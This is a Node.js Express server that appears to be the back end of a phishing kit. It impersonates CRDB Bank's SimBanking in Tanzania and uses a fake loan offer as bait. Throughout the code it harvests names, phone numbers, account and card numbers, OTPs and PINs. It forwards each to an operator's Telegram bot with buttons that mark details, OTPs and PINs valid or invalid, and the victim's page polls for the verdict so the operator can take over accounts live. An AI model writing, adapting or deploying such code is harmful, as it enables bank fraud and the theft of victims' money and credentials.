const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const sessions = {};

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';

async function sendTelegramMessage(text, replyMarkup = null) {
  if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
    console.log('Telegram token not configured. Message:', text);
    return;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: 'HTML'
  };
  if (replyMarkup) {
    body.reply_markup = replyMarkup;
  }
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (err) {
    console.error('Telegram error:', err);
  }
}

app.post('/api/submit', async (req, res) => {
  const { step, data, clientId } = req.body;
  if (!sessions[clientId]) sessions[clientId] = {};
  sessions[clientId] = { ...sessions[clientId], ...data, currentStep: step, status: 'pending' };

  if (step === 'account_details') {
    const text = `<b>[CRDB SIMBANKING TANZANIA] New Loan & Account Submission</b>\n` +
                 `Loan Amount: ${sessions[clientId].loanAmount || 'N/A'}\n` +
                 `First Name: ${sessions[clientId].firstName || 'N/A'}\n` +
                 `Last Name: ${sessions[clientId].lastName || 'N/A'}\n` +
                 `Phone (+255): ${sessions[clientId].phone || 'N/A'}\n` +
                 `Account Number: ${data.accountNumber}\n` +
                 `Card Number: ${data.cardNumber}`;
    
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: 'WRONG DETAILS', callback_data: `wrong_details_${clientId}` },
          { text: 'CORRECT DETAILS', callback_data: `correct_details_${clientId}` }
        ]
      ]
    };
    await sendTelegramMessage(text, replyMarkup);
  } else if (step === 'resend_otp') {
    const text = `<b>[CRDB] User requested to RESEND OTP (♻️ Tuma OTP tena)</b>\nClient ID: ${clientId}`;
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: 'OTP CORRECT', callback_data: `otp_correct_${clientId}` },
          { text: 'OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` }
        ]
      ]
    };
    await sendTelegramMessage(text, replyMarkup);
  } else if (step === 'otp_submitted') {
    const text = `<b>[CRDB] OTP Submitted:</b> ${data.otp}\nClient ID: ${clientId}`;
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: 'OTP CORRECT', callback_data: `otp_correct_${clientId}` },
          { text: 'OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` }
        ]
      ]
    };
    await sendTelegramMessage(text, replyMarkup);
  } else if (step === 'pin_submitted') {
    const text = `<b>[CRDB] PIN Submitted:</b> ${data.pin}\nClient ID: ${clientId}`;
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: '3 INVALID PIN', callback_data: `invalid_pin_${clientId}` },
          { text: 'VALID PIN', callback_data: `valid_pin_${clientId}` },
          { text: 'LOAN APPROVED', callback_data: `loan_approved_${clientId}` }
        ]
      ]
    };
    await sendTelegramMessage(text, replyMarkup);
  }

  res.json({ success: true, status: sessions[clientId].status });
});

app.get('/api/status/:clientId', (req, res) => {
  const clientId = req.params.clientId;
  const session = sessions[clientId] || { status: 'pending' };
  res.json(session);
});

app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    const callbackData = update.callback_query.data;
    let clientId = '';
    let action = '';

    if (callbackData.startsWith('loan_approved_')) {
      action = 'loan_approved';
      clientId = callbackData.replace('loan_approved_', '');
    } else {
      const parts = callbackData.split('_');
      action = `${parts[0]}_${parts[1]}`;
      clientId = parts[2];
    }

    if (!sessions[clientId]) sessions[clientId] = {};

    if (action === 'wrong_details') sessions[clientId].status = 'wrong_details';
    else if (action === 'correct_details') sessions[clientId].status = 'correct_details';
    else if (action === 'otp_correct') sessions[clientId].status = 'otp_correct';
    else if (action === 'otp_incorrect') sessions[clientId].status = 'otp_incorrect';
    else if (action === 'invalid_pin') sessions[clientId].status = 'invalid_pin';
    else if (action === 'valid_pin') sessions[clientId].status = 'valid_pin';
    else if (action === 'loan_approved') sessions[clientId].status = 'loan_approved';

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: update.callback_query.id, text: 'Recorded successfully' })
    });
  }
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`CRDB Server running on port ${PORT}`);
});
  
